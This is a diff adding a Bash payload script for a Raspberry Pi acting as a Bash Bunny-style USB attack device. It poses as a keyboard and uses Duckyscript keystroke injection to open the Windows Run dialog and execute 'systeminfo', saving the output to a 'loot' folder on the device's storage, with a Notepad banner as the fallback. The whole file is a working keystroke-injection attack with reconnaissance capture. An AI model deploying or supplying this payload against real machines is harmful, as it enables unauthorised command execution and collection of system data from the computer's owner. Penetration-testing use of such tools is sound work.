@@ -1,0 +1,41 @@
+#!/bin/bash
+# switch2 · HID PWN — re-enumerate as USB keyboard (HID) + udisk, then inject
+# Duckyscript via QUACK.
+#   Windows host : Win+R -> cmd -> `systeminfo` written to the pi's mounted
+#                  BashBunny drive (typically E:\loot\sysinfo.txt).
+#   anything else: types a banner into Notepad instead so the run stays visible.
+# The USB HID waits for the host to enumerate /dev/hidg0, so attach a host.
+LED SETUP
+ATTACKMODE HID STORAGE
+sleep 1
+LED STAGE1
+mkdir -p /root/udisk/loot
+
+if [ ! -c /dev/hidg0 ]; then
+    echo "[!] /dev/hidg0 missing - HID gadget not armed"
+    LED R SINGLE
+    sleep 1
+    LED OFF
+    LED FINISH
+    exit 1
+fi
+
+# Duckyscript: GUI r -> cmd /c systeminfo > E:\loot\sysinfo.txt
+QUACK "REM pibunny hid_pwn" \
+    "DEFAULT_DELAY 30" \
+    "GUI r" "DELAY 500" \
+    "STRING cmd /c systeminfo 2^>nul ^> E:\loot\sysinfo.txt" "ENTER" \
+    "DELAY 3000"
+
+if [ -s /root/udisk/loot/sysinfo.txt ]; then
+    echo "[+] captured systeminfo -> loot/sysinfo.txt"
+else
+    echo "[!] nothing captured (host not MS Windows or E:\ wrong) - typing banner"
+    QUACK "DEFAULT_DELAY 30" \
+        "GUI r" "DELAY 500" \
+        "STRING notepad" "ENTER" \
+        "DELAY 1500" "STRING PiBunny HID armed - switch2" "ENTER"
+fi
+echo "[$(date -u +%FT%TZ)] switch2 hid_pwn ran" >> /root/udisk/loot/run.log
+LED FINISH
+exit 0
